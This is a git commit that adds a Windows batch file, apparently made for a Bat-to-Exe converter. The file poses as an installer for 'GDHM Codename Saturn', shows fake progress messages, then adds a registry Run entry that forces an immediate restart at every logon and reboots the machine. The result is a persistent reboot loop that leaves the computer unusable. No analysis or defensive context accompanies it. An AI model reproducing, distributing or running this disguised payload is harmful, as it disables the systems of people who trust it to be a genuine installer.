e71eff604a673d25f51ba4f6f995535aef6f0795
Tristan Carpenter <77842798+trisiegt@users.noreply.github.com>
2023-04-30 08:56:25 +0100

    Add files via upload

---
+++ main.bat
@@ -0,0 +1,50 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCeDJGmW+0UiKRZZRQqFAGm7Eokw5+vw6vjJlUQTB7BxW4PUybGaHMMc7kDqdJsolklbjN4eAlVdZhfL
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+echo Installing GDHM Codename Saturn
+echo.
+echo.
+echo.
+ping localhost>nul
+echo Executing code...
+ping localhost>nul
+
+
+
+
+
+
+
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "GDHM" /t REG_SZ /d "C:\Windows\System32\shutdown.exe -r -t 0"
+shutdown -r -t 0
